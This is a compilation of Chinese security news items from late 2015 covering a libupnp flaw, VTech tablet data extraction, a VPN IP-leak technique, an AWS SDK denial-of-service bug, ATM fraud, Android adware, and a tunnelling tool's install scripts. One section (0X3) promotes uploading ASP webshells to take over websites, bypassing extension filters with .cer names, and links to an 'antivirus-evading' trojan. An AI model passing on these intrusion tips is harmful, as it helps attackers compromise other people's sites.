-----------------------------------------------------------0-----------------------------------------------------------
0X0: 
     [12.7]libupnp漏洞归来影响大量智能系统设备 

=700) window.open('http://image.3001.net/images/20151206/14493660441209.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
目前趋势科技（Trend Micro ）发布了一份报告显示，便携式UPnP设备SDK当中存在一个3年之久的安全漏洞 ，这个被称为 libupnp的漏洞，出现在数以百万计的智能电视，智能手机和路由器当中。
该漏洞影响较为广泛
更加讽刺的是，漏洞本身在2012年12月被修补，但是开发人员大都还是使用包含libupnp漏洞的旧版本SDK开发各种移动应用、智能电视的应用程序、以及路由器的固件。
目前趋势科技估计，该漏洞存在于约610万台设备当中。该公司还检测了不同的智能应用程序，并发现该漏洞存在于547款应用程序当中，谷歌应用程序商店当中有326款这样的应用程序。像是一些热门应用均使用了包含漏洞的旧版本SDK进行开发，它们都使用libupnp播放媒体文件或连接到局域网当中的其他设备。攻击者可以利用这个漏洞在受影响的设备当中触发缓冲区溢出，这反过来会导致远程代码执行。
漏洞导致恶意攻击者远程控制目标设备
大多数攻击者采用缓冲区溢出让设备进入更危险的入侵状态。当大量数据交付到使用固定大小的缓冲区来处理动态输入的设备当中，就引发了缓冲区溢出。如果设备功能配置正确，溢出的数据将会出现丢失现象。如果不是，设备死机或溢出部分数据被写入到内存中。该libupnp库1900端口容易受到缓冲区溢出影响，攻击者可以发送大量简单服务发现协议（SSDP）数据包到这个端口，溢出缓冲区，让设备崩溃，或者在受影响的设备上运行任意代码。
趋势科技（Trend Micro ）的移动威胁分析师Veo Zhang表示，“
随着研究的深入发现这个漏洞不仅可以导致设备崩溃，还可以使恶意攻击者在受影响的设备上面远程执行恶意程序，也可使得恶意攻击者有机会远程控制该设备。”
趋势科技（Trend Micro ）发布的详细报告（点击我）







-----------------------------------------------------------1-----------------------------------------------------------
0X1: 
     [12.7]【漏洞细节】VTech平板电脑：多个数据泄露的隐患暗藏 

 =700) window.open('http://image.3001.net/images/20151205/14492992254585.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
在最近的VTech数据泄露事件后，大家或许认为VTech的电子玩具安全性不会比现在更糟糕了。然而就在这种情况下，我们又发现了两个漏洞，黑客可以从孩子们的Innotab平板里攫取数据。
 
刷机模式窃取数据
对于丢失、被盗或者转售的平板电脑，黑客可以获取里面储存的密码、PIN码、邮件地址、应用数据，以及机器名等等。
现在让我们来拆拆看，到底我们能从里面找到什么呢？
=700) window.open('http://image.3001.net/images/20151205/14492971171269.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
上图是我们的老朋友RockChip CPU，型号不太清晰，似是RK3188。这里附上对它的介绍，我们继续往下看：
大多数像这样的设备需要一个从板砖恢复正常的模式，比如更新包出错导致的窘况。从某一方面来讲，这的确是个不错的恢复模式，我们可以在这种状态下往设备里写入新的固件。
然而这种模式的败笔在于，黑客同样可以利用它读取数据，接下来让我们动手试试：
首先，你需要把线插入平板电脑的USB接口，按住方向键的左键和上键，并同时按住电源键三秒，就可以进入flash模式了。此后，你需要rkflashtool来读取内存，而下面的是你将获取到的参数：


FIRMWARE_VER:4.1.1
 MACHINE_MODEL:rk30sdk
 MACHINE_ID:007
 MANUFACTURER:RK30SDK
 MAGIC: 0x5041524B
 ATAG: 0x60000800
 MACHINE: 3066
 CHECK_MASK: 0x80
 KERNEL_IMG: 0x60408000
 #RECOVER_KEY: 1,1,0,20,0
 CMDLINE:board.ap_mdm=0 board.ap_has_earphone=1 board.ap_has_alsa=0 board.ap_mult
 i_card=0 board.ap_data_only=2 console=ttyFIQ0 androidboot.console=ttyFIQ0 init=/
 init initrd=0x62000000,0x00800000 mtdparts=rk29xxnand:0x00002000@0x00002000(misc
 ),0x00006000@0x00004000(kernel),0x00006000@0x0000a000(boot),0x00010000@0x0001000
 0(recovery),0x00020000@0x00020000(backup),0x00040000@0x00040000(cache),0x0000200
 0@0x00080000(kpanic),0x00004000@0x00082000(app),0x00300000@0x00086000(system),0x
 00100000@0x00386000(data),-@0x00486000(userdata)
 
我们所需要的大量数据就存在这里，这台机器的系统是安卓4.1.1版本的。此外，我们还获取了用户数据区域的起始地址（0×00486000）。
黑客想要dump出所有用户数据，仅仅需要一小时左右。
这个漏洞其实已经存在有两年多了，然而VTech一直在生产这种会泄露孩子们个人数据的平板电脑。
SD卡里的用户数据
而且这还不算全部，接下来让我们看看另一个漏洞：
 
 =700) window.open('http://image.3001.net/images/20151205/1449298140645.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
在该款VTech平板电脑的主板上，还粘上了microSD卡，但是我们可以很轻松地将其撬下来。
黑客在这个可拆卸的SD卡中，可以轻松读取机器文件系统和用户数据。我们并没有取另一种容易的法子读取敏感数据，这也考虑到了可靠性问题。
卡里面有几个G的数据，我们没有花时间去分析它，但下面的hexdump图能够证明这一点：
=700) window.open('http://image.3001.net/images/20151205/14492978395353.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
默认启用的ADB
另外还有个可以root的漏洞，ADB默认启用，我们可以利用它对系统进行root。
=700) window.open('http://image.3001.net/images/20151205/14492979637264.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
其实，VTech本可以将给孩子们的硬件安全做的更好。


 
这款儿童平板在国内鲜少，但是还是报导给大家看，了解一下内容......
 





-----------------------------------------------------------2-----------------------------------------------------------
0X2: 
     [12.7]原理说明：VPN协议缺陷是如何导致攻击者探测到用户真实IP地址 

=700) window.open('http://image.3001.net/images/20151204/14492164782791.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
之前看了Freebuf的《小心翻墙：某些VPN下载时会泄露个人信息》，这篇文章对这个漏洞的影响的说明，搜索了几篇博文，但都只是报道，并没有提及其中的具体原理，于是自己Google到了原始的几篇文章，并摘取翻译整理此文，用以简单说明原理和大家分享。
 
端口失败(Port Fail)漏洞影响所有的VPN协议(包括IPsec, OpenVPN, PPTP, 等等)和所有的操作系统，在一定条件下加以利用，可以使得受害者将真实IP暴漏给攻击者。Perfect Privacy表示他们在公布这一发现之前已经测试了9家服务商VPN服务，其中5个都存在上述漏洞。。
 
这个漏洞利用需要以下几个条件:
 
有一个和目标相同VPN服务提供商提供的可用的账户
知道目标的VPN出口IP地址(可以通过多种方法获取:例如IRC、torrent客户端或让目标访问一个我们控制的网站)
攻击者可以设置端口转发(port forwarding)
漏洞利用方式：
 
1.目标连接到VPN服务器(假设为1.2.3.4)
2.目标的路由表配置类似于一下这样:
&#160&#160 0.0.0.0/0 -&gt 10.0.0.1 (internal vpn gateway ip)
&#160&#160 1.2.3.4/32 -&gt 192.168.0.1 (old default gateway)
3.攻击者链接到了同一个服务器1.2.3.4(通过IRC或者其他手段知道目标的出口IP)
4.攻击者在服务端配置激活端口转发，比如使用12345端口
5.攻击者等待目标访问1.2.3.4:12345(比如通过在网站嵌入&ltimg src=”=700) window.open('http://1.2.3.4:12345/x.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >”&gt的方式)
6.这个连接将会吧目标的真实IP暴露给攻击者。因为：
&#160&#160 1.2.3.4/32 -&gt 192.168.0.1
这一条VPN路由。
 
这个漏洞其中的问题就在于:VPN用户在连接到VPN服务器时，会使用自己的的默认路由和他自己的真实IP地址，而这也是连接VPN所必须的。如果有其他用户(攻击者)在同一个服务器上设置了端口转发时，他(攻击者)就可以通过诱导用户访问自己构造链接获取任意一个使用相同VPN服务器的用户的真实IP地址了。
 
修复方案：
 
服务端有多个IP地址(IP1-IPx)，允许客户端接入IP1，再通过IP2-IPx接出，对IP2-IPx作端口转发
对客户端连接，设置服务器端的防火墙规则，来阻止客户端的真实IP访问不属于自己的端口转发。
Reference:
小晓城
小心翻墙：某些VPN下载时会泄露个人信息
VPN用户要小心了！Port Fail漏洞会暴露你的真实身份
VPN protocol flaw allows attackers to discover user's true IP address




-----------------------------------------------------------3-----------------------------------------------------------
0X3: 
     解说asp小马为何越来越少人使用 

=700) window.open('http://www.asp-muma.com/content/uploadfile/201510/1f151444665179.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" > 
2011-2013年那段时间很多人拿站习惯性的先上传“asp小马”然后再上传“asp大马” 
有人会疑问为什么呢？因为那时候的网站后台系统大多数上传点限制了上传文件大小， 
而现在大部分网站已经不再限制，不排除少量网站存在这种限制。 
说说现在后台系统大多数是怎么个情况吧，很多系统已经限制了上传文件扩展名， 
例如：asp、asa、php、aspx、jsp 等等...... 
遇到这种情况不要放弃，我们可以把文件扩展名修改为cer，不明白的朋友看全名：aspdama.cer 
不是一定要修改文件扩展名，还有上传点抓包改包等等...... 

以前的网站很容易就可以拿到“webshell”，如今大部分都装了网站杀毒软件，如：360、安全狗、护卫神等等....... 
如果网站有杀毒拦截拿“shell”是有点麻烦的，但是别担心，还有“免杀asp大马”呢，“php大马”的也有！ 
百度搜索大部分“asp大马”说是“免杀过狗大马”其实是不免杀的，在这里我推荐一个“2KB免杀全球asp木马”看下面： 
在线下载地址：http://www.asp-muma.com/?post=20
下面是今天用安全狗v4.2增强版查杀的结果，完美过杀毒，看图： 
=700) window.open('http://www.asp-muma.com/content/uploadfile/201510/1f151444665105.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" > 

希望小编写的这篇文章对你有用处，好友各位朋友收藏本网站，每天会更新文章，总有一篇文章对你有帮助。 
转载文章麻烦请带上文章来源，谢谢！




-----------------------------------------------------------4-----------------------------------------------------------
0X4: 
     [12.4]Adele强势归来，歌迷称个人信息因购票遭泄露 

=700) window.open('http://image.3001.net/images/20151202/14490589336972.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
沉寂三年之后，25岁的灵魂乐手Adele携新专辑《25》强势归来，专辑发行首周便狂扫英美销量纪录，评论界称：即便她发售磁带，也会成为销量冠军。
而购买Adele巡回音乐会的热情粉丝告诉BBC，他们在购票过程中看到了其他人的地址及信用卡信息。
购票页面出现别人信息
Adele巡演的预售票于12月1日早晨正式在Adele.com网站对外发售。对于一些歌迷称看到别人购物车以及付款详情的异议，票务公司Songkick回应：由于网站遭遇“极端负载”，导致一些顾客能够看到其他人的账户信息，对此我们感到抱歉。
“任何人于任何情况下都无法得到另一个人密码，更不用提支付或者信用卡信息（而且这些信息并非由Songkick保存）。”粉丝表示很担忧

来自伯敏翰的Kiran Farmah称她订购了格拉斯哥（英国城市名）的演出票。她在推特上称：
“我好不容易抢到了票，结果屏幕上却显示出别人的支付卡信息和家庭住址。”来自英国另一个城市沃金的Emma Herris也遇到了相同的经历：

“在排了大约一个半小时后，我们点击打算购买的票，然后被跳转到一个不同票种的页面去了。”“即便这样我们也忍了，不然我们会失去了这个见Adele的机会。可是当我们到下一个页面时，填写的所有内容都被换成了其他的，比如别人的名字、地址以及信用卡号码。”Herris说，她费了好大的力删掉其他人“长长的卡片信息”，最终抢到明年三月伦敦O2剧场的演唱会门票。
“这绝对令人担忧，因为我知道还有很多朋友和我遭遇了相同的情形，我们的信用卡信息可能被暴露，而我们却不知道究竟泄露给了什么样的人。”
=700) window.open('http://image.3001.net/images/20151202/14490589436278.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >安全专家认为这是一个漏洞
安全顾问Graham Cluely表示，这一事件“听起来非常”像是一个安全漏洞。
“事情听起来像是网站并不安全，因此泄露了应该被保密的其他人信息。”同时Cluely认为，虽然目前无法确定用户信用卡数据是否被泄露，但他建议用户还是应当提高警惕。

“如果这些信息已经被泄露，请密切关注你的银行账户及信用卡对账单。发现任何不寻常的活动，对于收到的短讯或非常规的电邮要十分小心。”
=700) window.open('http://image.3001.net/images/20151202/14490591836665.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >在线票务的困境

近期，酷玩乐队签署了一封公开信，文中呼吁政府针对二级售票网站进行管理，文中说由于在线售票网站存在匿名的哄抬票价行为，歌迷因此饱受压榨。
Songkick解释道，Adele的演出票只存在一些“低价”票的转卖行为，这也就意味着周二早晨已售出的5.7万张票中，只有2%的留到了二级网站，可能受到“漏洞”影响。
喜欢Adele的歌迷可以去看BBC出品Adele新专辑访谈，个人推荐《Adele皇家艾尔伯特音乐大厅演唱会》。


 
 





-----------------------------------------------------------5-----------------------------------------------------------
0X5: 
     [12.1]麻省理工学院（MIT）打造可食用性电子设备 

=700) window.open('http://image.3001.net/images/20151122/14481653214376.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
 
麻省理工学院（MIT）在近期开发出一种更为先进的设备，因为这种设备是可以被病人“吃”下去的。现在很多时候为了能够更好的检查病人的情况，医院通常会采用植入式的方法将传感器直接接入到人的皮肤当中。（医院有时候为了治疗病人也会植入设备，例如心脏起搏器等等）麻省理工学院（MIT）的研究人员表示，他们开发的新型传感器更容易了解病人的生理情况，也可以运用于军事，来了解士兵战场上的活动情况，或者用来监控运动员平时训练情况，以便更好地调整运动员的训练。
 
设备未来前景很广目前医生如果想要了解一些病人的生理情况，则需要一些穿戴式的监控设备来监控生理情况。但是这些穿戴式设备往往病人穿戴起来并不是很舒适。于是研究人员开始考虑，是不是可以发明一种新的设备可以去掉这些缺点。研究人员开始做一个传感器来替代传统的穿戴式设备，用来监控心跳，呼吸速度，以及消化道的温度等等。
在过去医生想要了解病人的心率，可以通过听诊器来获得病人的心跳情况。而目前，想要获得心跳情况，可以使用做心电图（心脏在每个心动周期中，由起搏点、心房、心室相继兴奋，伴随着生物电的变化，通过心电描记器从体表引出多种形式的电位变化的图形（简称ECG）的方式来获得。研究人员表示，现在你可以“吃”下去这个胶囊，你就可以知道自己的心跳情况了。
参与该项目的John Rogers教授在接受采访时称：
“这个设备不同于过去那种穿戴式设备，在衣服或者皮肤上附着，而这种设备是可以短暂停留在你的消化道里面的。”
设备已经获得审批
根据目前研究人员的估计，该胶囊会在消化道里面停留1-2天，如果需要对病人长期监控，必须在有效期过去，吞入新的胶囊。研究人员表示，如果该胶囊和温度传感器结合，那么可以监控一些由于感染引发疾病的患者。
这款设备已经获得了美国食品和药品监督局（FDA）的批准，病人可以像吃胶囊那样将传感器吞到肚子里。而在人体内，它不但可以传输高清视频用来最清楚的显示病人的肠胃情况，还可以通过其它方面的传感功能，计算心率和呼吸频率，以更好的检测心脏和肺部功能。同时，在这个设备当中电子处理音频的收集功能，可以有效的区分心率和肺率，从而使医生能够更加清楚的获取信息。
最后研究人员希望通过研究努力的成果和更加先进的传感器获取病人体内更多的信息，同时也为他们提供更多更好的治疗方案，从而推动整个医疗事业的进展。
 
观看视频

http://v.qq.com/page/c/q/q/c0173r0s7qq.html
 





-----------------------------------------------------------6-----------------------------------------------------------
0X6: 
     [12.1]Amazon AWS Java SDK漏洞披露 

今天我们来讨论下Amazon AWS java SDK的一个拒绝服务漏洞。这个官方的AWS SDK常被Java开发者用于整合一系列的AWS服务，包括像Amazon S3中整合Amazon APIs用于存储和索引文件等。其中1.8.0-1.10.34版本的官方AWS Java SDK已被确认受到影响，而最新版1.10.36 SDK已经修复了这个漏洞。这个漏洞可以利用AWS Java SDK操纵存储在Amazon S3上的文件来实现对web服务的攻击。攻击者可以上传文件到S3存储中让web服务使用SDK执行，执行时可能会出现死循环从而导致拒绝服务。
鉴于AWS Java SDK是Amazon默认提供给Java开发者使用的，这个漏洞有着很广的影响面。例如：Nuxeo 一个非常受欢迎的开源框架�使用AWS S3 SDK存储文件的内容管理系统。大量使用Nuxeo框架的商业应用都会受到这个漏洞的影响。
我们已经将这个漏洞私下提交给了Amazon AWS安全团队。Amazon迅速修复了这个漏洞并于上周在Maven Central发布了新版本的SDK。具体修改的代码可以查看这里。
 
概述这个问题存在于SDK里SdkDigestInputStream类的skip方法。标准中规定其应该返回略过的字节数，但在一些特殊情况下其会返回-1。skip方法是2014年6月21日作为另一个问题的修复方案加入到类中的。在此之前SdkDigestInputStream并没有重载skip方法。
 
分析如果我们查阅Java官方文档关于InputStream类中skip方法的描述，文档说skip方法应该返回实际略过的字节数。如果没有略过或者输入是负数，那么skip方法会返回0。不管任何情况下skip方法都不应该返回一个负数。
看SdkDigestInputStream.java的第75行（来自之前的提交https://github.com/aws/aws-sdk-java/commit/257dd4908cf99ec1982feed247fd2253589c222a#diff-97412a92b5fccaea1893be646257fa3b），skip方法可能返回-1：
=700) window.open('http://image.3001.net/images/20151125/14484423428197.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
返回的这个负值可能会导致其他接收skip方法返回值的方法出错，因为这些方法从来没考虑过接收一个负值。例如：看下popular Apache Commons Compress library中的IOUtils类。它通过调用skip方法处理底层的InputStream来实现自己skip方法。
=700) window.open('http://image.3001.net/images/20151125/14484423764049.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
这个方法使用了while循环，其中skip方法的返回值用于结束循环。
while (numToSkip &gt 0) {long skipped = input.skip(numToSkip)if (skipped == 0) {break}numToSkip -= skipped}当Amazon S3存储使用SDk读取底层input数据流时，skip方法可能会返回-1。这个返回值存储在skipped变量中。因此，循环结尾处的numToSkip -= skipped变成了numToSkip -= -1。这样变量numToSkip会不停的增长最终变成死循环。
实例
攻击场景出现于Amazon S3存储文件使用AWS SDK处理时。Apache Commons Compress library是一个Java中非常常用的处理归档的库。
对于使用Amazon S3的Web服务来说.tar是最容易遭受拒绝服务攻击的。攻击者只需创建一个带有额外填充数据(空字节)的归档上传到网站。然后，AWS S3 SDK会读取文件并将inputStream传递给TarArchiveInputStream类。为了略过额外的填充数据会调用skipRecordPadding方法：
=700) window.open('http://image.3001.net/images/20151125/14484425167180.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
这个方法在第335行调用skip方法，之后程序就会进入一个死循环从而导致拒绝服务。
修复
一个新版本的AWS SDK已经发布在Maven Central，我们建议立刻升级到这个版本。假如你不能升级的话，那么可以进行如下修复。
如果你直接调用了skip方法，那么你可以增加一个判断确保其返回值&gt=0。另外，如果需要你可以你可以复制inputStream到一个字节数组中，然后在把数组传递给需要调用的应用。例如，使用Apache Commons Compress library处理.tar时可以使用如下代码：
// Assuming that input is the inputStream obtained from the AWS S3 SDKByteArrayOutputStream baos = new ByteArrayOutputStream()IOUtils.copy(input, baos)ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray())TarArchiveInputStream tarStream = new TarArchiveInputStream(bais)


 





-----------------------------------------------------------7-----------------------------------------------------------
0X7: 
     [12.1]俄罗斯黑客利用“反向ATM攻击”技术盗取近400万美元现金 

=700) window.open('http://image.3001.net/images/20151126/14485479176364.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >

根据俄罗斯数字情报公司Group-IB掌握的信息，俄罗斯网络罪犯使用了一种称为“反向ATM攻击（Reverse ATM Attack）”的技术，并成功地从至少五个不同的银行盗取了2.52亿卢布（合380万美元）。
什么是反向ATM攻击？根据情报公司Group-IB的消息，攻击者通过使用ATM机，分别将金额5000、10000和30000卢布的钱存到合法的银行账户中，然后立刻提取相同金额的现金，并打印支付交易费用的收据。其中收据中的细节信息包括一个支付参考号和提取款项的数额，然后攻击者收据信息转移给另一个合作的黑客，而这个合作黑客能够远程访问受感染的POS终端，这些POS终端通常位于俄罗斯境外。
Forbes解释道，合作黑客将使用这些详细信息向一台POS终端发起一个逆转操作，这将导致POS终端认为提款被拒绝了，从而欺骗成千上万的美国和捷克POS终端。同时，银行这边看起来好像提取现金的操作被取消了，例如：当客户资金不足时，则同等数额的现金将被转移到攻击者的银行账户中，而这整个过程都使用了一种全球“钱骡（money mule）”网络。接下来，黑客将会重复这些步骤，直到目标ATM机中的现金被取完。
=700) window.open('http://image.3001.net/images/20151126/14485483263717.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
通过ATM攻击，黑客盗取了380万美元现金
Group-IB表示，该公司在五家不同的俄罗斯银行中已经观察到至少五起此类事件，这种犯罪活动开始于2014年夏天，并结束于2015年第一季度。黑客利用了俄罗斯国内信用卡交易所使用的取款、转款和验证阶段的漏洞，并设法绕过VISA和MasterCard推荐的检测（check）机制。
这里的“检测”的意思是：
1、当反向操作针对单一银行时，VISA提供的交易细节未被受影响的银行验证。2、当ATM取款在一个国家进行，而取消或反向操作在另一个国家进行，那么同样会缺少某些验证。Group-IB正与联邦当局深入调查整个洗钱事件。







-----------------------------------------------------------8-----------------------------------------------------------
0X8: 
     [11.30]安卓恶意软件Shedun回归影响大量安卓用户（含视频） 

=700) window.open('http://image.3001.net/images/20151123/14482536215009.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
移动安全公司Lookout发现，即便用户已经明确拒绝了界面跳转出来的安装请求，一些Android广告软件仍旧会自行开始在系统安装。
利用合法功能的Shedun家族

这些广告软件出自一个叫做Shedun的家族，包括Shedun (GhostPush)、 Kemoge (ShiftyBug)、Shuanet，通过欺骗用户授权安装。实际的情况是其会跳转出安装恶意广告软件的窗口，并且当用户明确选择拒绝时，它仍旧会继续安装，将自己安装到系统之中。
Shedun并没有利用系统的漏洞，相反，它利用了系统服务中的合法功能，即通过获取许可使用可访问性服务读取屏幕上出现的文本信息，然后当屏幕上出现安装窗口时再决定是否安装该软件。
=700) window.open('http://image.3001.net/images/20151123/14482533537461.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
研究人员也表示，在上周三的报告中，对于Shedun的家族，包括Shedun (GhostPush)、 Kemoge (ShiftyBug)、Shuanet，与其它恶意软件不同的地方在于并不是利用系统的漏洞，同时也是为数不多较难从Android系统中卸载掉的恶意软件，因为它是直接将自己植入到设备中并嵌入系统分区里边，这样即便用户对设备进行了恢复原厂设置它仍旧能够存在。
恶意软件很难删除
通过欺骗用户授权安装，其可获得专为视觉障碍用户设计的Android Accessibility Service的控制权限。同时这意味着他们可以读取屏幕上的文本信息，并将自己植入到设备中并嵌入系统分区里边。
该团队研究人员曾在过去一年研究了三个广告程序家族，包含Shuanet、ShiftyBug与Shedun，这三大家族把自己的广告程序绑定2万多款的应用程序中，遭假冒的应用程序多半都是Google Play中最受欢迎的程序，广告程序作者篡改这些程序后，再由第三方的Android程序市场发布。最初版本的Shedun仅仅目标只是投放广告，但是目前版本的功能可以在安装过程中打开第三方辅助功能。
=700) window.open('http://image.3001.net/images/20151123/14482532119482.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
Shedun目前直接将自己植入到设备中并嵌入系统分区里边，即使用户在使用设备中恢复出厂设置功能，该种恶意软件依旧会存在。
 





-----------------------------------------------------------9-----------------------------------------------------------
0X9: 
     [11.30]P2P端口映射开源工具：狗洞（dog-tunnel） 

=700) window.open('http://image.3001.net/images/20151125/14484430556045.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
狗洞是一个高速的P2P端口映射工具，同时支持Socks5代理。
0.5版后开始开源，UDP底层基于开源库KCP重写，效率大大提高，在恶劣环境下优势明显。同时提供非P2P版本（Lite版本），两端连接过程完全不依赖中间服务器，支持加密和登陆认证，自动重连，但是需要人为确保两端能正常连通（否则请使用默认的P2P版本）
功能
将远端指定端口经狗洞映射到近端后，可进行高速访问
特性


 
 数据安全，p2p模式通讯时数据不经过服务端，用户可自定义访问密码
p2p模式底层采用KCP协议，在恶劣网络环境下比tcp延迟降低 30%-40%
p2p模式支持AES加密
p2p模式可以穿透80%的网络
p2p模式失败时自动切换到c/s模式
原生支持远端socks5代理
支持多洞模式，多连接时动态切换狗洞提高访问速度
远端掉线自动重连
开放lite版本测试，完全点对点不依赖服务器，需要确保一方有公共IP，自动重连，加密，登录认证，支持透明代理
适用于
可访问远程局域网的服务，例如HTTP，VNC远程控制，SSH等Socks5 反代理，公司内借助代理挂QQ，公司外访问公司内网站等
安装
Fedora 20/21 &amp CentOS 6/7
#!/bin/sh
# need run as root
cd ~
yum install -y tar
mkdir /root/goworkspace
wget https://storage.googleapis.com/golang/go1.4.2.linux-amd64.tar.gz
tar zxvf go1.4.2.linux-amd64.tar.gz
echo 'export GOROOT=/root/go' &gt&gt .bashrc
echo 'export GOPATH=/root/goworkspace' &gt&gt .bashrc
echo 'export PATH=&quot/root/go/bin:/root/goworkspace/bin:&quot$PATH' &gt&gt .bashrc
source ~/.bashrc
yum install -y git
git clone https://github.com/vzex/dog-tunnel.git
cd dog-tunnel
go get github.com/go-sql-driver/mysql
make
mv dtunnel /usr/bin/dtunnel
Ubuntu/Kubuntu 14.04、14.10
 
#!/bin/sh
# need run as root
cd ~
apt-get update &amp&amp apt-get dist-upgrade -y &amp&amp echo 'Upgrade system ok'
apt-get install tar wget curl git make gcc build-essential -y &amp&amp echo 'package installed'
mkdir /root/goworkspace
wget https://storage.googleapis.com/golang/go1.4.2.linux-amd64.tar.gz
tar zxvf go1.4.2.linux-amd64.tar.gz
echo 'export GOROOT=/root/go' &gt&gt .bashrc
echo 'export GOPATH=/root/goworkspace' &gt&gt .bashrc
echo 'export PATH=&quot/root/go/bin:/root/goworkspace/bin:&quot$PATH' &gt&gt .bashrc
source ~/.bashrc
git clone https://github.com/vzex/dog-tunnel.git
cd dog-tunnel
go get github.com/go-sql-driver/mysql
make
mv dtunnel /usr/bin/dtunnel
项目地址：https://github.com/vzex/dog-tunnel/

官网：http://dog-tunnel.tk/

使用案例：http://dog-tunnel.tk/case
 
 
 





-----------------------------------------------------------10-----------------------------------------------------------
0X10: 
     [11.30]匿名者组织攻破ISIS暗网站点：药不能停 

=700) window.open('http://image.3001.net/images/20151126/14485270295376.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
隶属于黑客组织匿名者的黑客团体GhostSec于周三攻破了ISIS的暗网宣传网站，用百忧解广告替换网站内容。GhostSec并在网站上发布了如下消息：

ISIS成员太多了。你需要冷静下来。太多人成为了ISIS成员。请看看这条可爱的广告，帮助我们升级基础设施，这样我们就可以为你们提供你们渴望的ISIS内容了。广告指向了CoinRx在线药店，这个药店号称是&quot头号比特币网上药店&quot，这个药店销售Viagra、Xanax等非处方类药品。这则广告和消息在原站被创建不到一周就被匿名者使用了。
这是匿名者组织对ISIS宣战后后拿下的数百个网站之一。虽然这是第一次ISIS在暗网中受到重创。众所周知，我们只能使用Tor即洋葱网络访问暗网。恐怖分子利用暗网作为安全屏障保护自己的宣传不受到黑客破坏。
安全专家Scot Terban表示，这个ISIS宣传网站的创建者在创建时犯下了一些菜鸟级别的错误，为匿名者组织留下了攻击通道。Terban在他的博客中写到：&quot这些数据背后的系统可能非常容易受到攻击。所有的数据让我相信，当局可以非常轻松的追送终端用户，但同时，我认为我可以在不攻击洋葱网络网站的情况下追查到隐藏在网站背后的ISIS成员。&quot
我们暂不谈论网站下架的事情，匿名者组织对ISIS宣战目前看起来是完全失败之举，全球的安全论坛和其他社交媒体都在批评匿名者的行为。被引用最多的批评都围绕着匿名者组织胡乱下架了一些属于ISIS中立方或非ISIS的网站和社交媒体账户。
Twitter发言人表示，近期公布的ISIS成员列表中成员定义非常不准确，并且名单里有很多学者和记者，他们根本不可能是ISIS成员。
我们不知道匿名者组织在未来如何打击ISIS，也不知道结果如何，但现在，我们只需要笑谈GhostSec把ISIS宣传站换成了售卖百忧解的广告，这一举动给中东极端组织极大打击就好了。
 





-----------------------------------------------------------11-----------------------------------------------------------
0X11: 
     [11.30]器学习来了，安全行业准备好了吗？ 

=700) window.open('http://image.3001.net/images/20151125/14484394932845.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
信息安全一直以来都是一个“猫捉老鼠”的游戏。好人建起防御的围墙，坏人想方设法通过或者绕过它。然而最近我们发现坏人似乎越来越容易绕过我们建立的高墙。想要阻止他们就需要提升我们自身的能力，也就意味着需要更广泛地使用机器学习。
FreeBuf 百科：机器学习
卡内基梅隆大学的教授Tom Mitchell在《Machine Learning》（《计算机科学丛书：机器学习》）序言中给出了一个定义：
机器学习这门学科所关注的问题是：计算机程序如何随着经验积累自动提高性能。2010年9月，Drew Conway创建了一个漂亮的维恩图，他解释道：“机器学习就是黑客技能、数学和统计学知识的加和。”
=700) window.open('http://image.3001.net/images/20151125/14484447508974.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
目前机器学习尚未在IT安全领域中被广泛应用，这或许会让一些旁观者感到惊讶。尽管安全专家称，信用卡欺诈检测系统和网络设备制造商正在使用最先进的分析方法。这一方法几乎被用于所有大公司的自动化共同安全保障活动，用于发现你电脑中的恶意软件，或者曝光网络中依赖人为编写代码以及配置的恶意活动。
虽然在网络安全领域针对机器学习技术的运用已经有了一些广泛的学术研究，而目前我们看到的仅仅是安全工具这一领域的拓展。诸如Invincea、Cylance、Exabeam以及Argyle Data这样的初创安全公司，将机器学习技术运用于开发安全工具，实现了比当今主流安全软件供应商更加快速、准确的服务。
恶意软件数据挖掘
来自FairFax公司的研究人员Josh Saxe表示，现在是时候摆脱创建于上世纪90年代、基于签名和哈希算法的陈旧方法了：
